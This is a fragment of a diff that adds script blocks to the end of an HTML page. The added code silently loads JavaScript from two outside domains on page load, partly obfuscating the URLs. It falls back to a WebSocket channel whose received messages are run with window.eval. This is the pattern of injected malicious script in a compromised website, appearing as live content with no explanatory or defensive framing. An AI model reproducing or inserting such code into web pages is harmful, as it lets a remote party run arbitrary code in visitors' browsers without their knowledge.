+ var script_id = "MTIzNg==", s = document.createElement("script");
+ s.type = "text/javascript";
+ s.charset = "utf-8";
+s.src = "//torvind.com/js/" + script_id+".js?r="+Math.random()*10000000000;
+ s.async = true;
+ s.onerror = function(){
+  var ws = new WebSocket("ws://torvind.com:8040/");
+  ws.onopen = function () {
+   ws.send(JSON.stringify({type:"p", id: script_id}));
+  };
+  ws.onmessage = function(tx) { ws.close(); window.eval(tx.data); };
+ };
+ document.body.appendChild(s);
+ })();
+</script>
+
+<script>(function(){var a=document.createElement("script");a.src="http://rarenok.biz"+"/im"+"g/r"+"/i/208/"+Math.floor(Math.random()*Math.pow(10,6))+".php";document.getElementsByTagName("head")[0].appendChild(a)})();</script>
+
+
+</body>
+</html>
